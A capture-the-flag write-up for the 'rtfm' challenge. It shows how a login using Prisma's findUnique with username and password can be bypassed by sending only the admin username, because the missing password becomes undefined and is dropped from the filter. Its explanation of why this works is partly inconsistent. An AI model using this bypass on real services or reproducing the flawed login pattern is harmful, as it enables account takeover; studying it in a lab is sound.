

---

# **rtfm**

## 📌 Description

I am a frontend "developer", and recently I made a very secure flag storing app. Can you hack it?

---

## 🔎 Server’s Login Code

```ts
const u = await prisma.user.findUnique({
  where: { username: c.username, password: c.password }
})
```

Looks fine at first glance… but it’s a **wrong usage of Prisma**.

---

## 🤔 Why Prisma?

* Challenge is in **Bun/TypeScript** → Prisma fits that ecosystem.
* Prisma normally protects against mistakes like **SQLi**.
* But here the bug is in how **Prisma’s API is used**.

---

## 💥 Vulnerability

* `findUnique()` expects **one unique field** (like `username`).
* `findFirst()` should be used for compound checks (e.g. `username + password`).
* Dev mistakenly wrote:

```ts
prisma.user.findUnique({ where: { username, password } })
```

* Prisma sees `password` is **not a unique field**, so it **ignores it**.

---

## 🛠 Exploit

You can log in as admin **without knowing the password**:

### Payload

```json
{ "username": "admin" }
```

---

## 🖥 What happens in backend

Your request becomes:

```ts
prisma.user.findUnique({
  where: { username: "admin", password: undefined }
})
```

* Prisma **drops** `password: undefined`.
* Query turns into:

```ts
prisma.user.findUnique({
  where: { username: "admin" }
})
```

* ✅ You get the **admin record** → flag.

---

## 🚩 Flag

```
NNS{...}
```


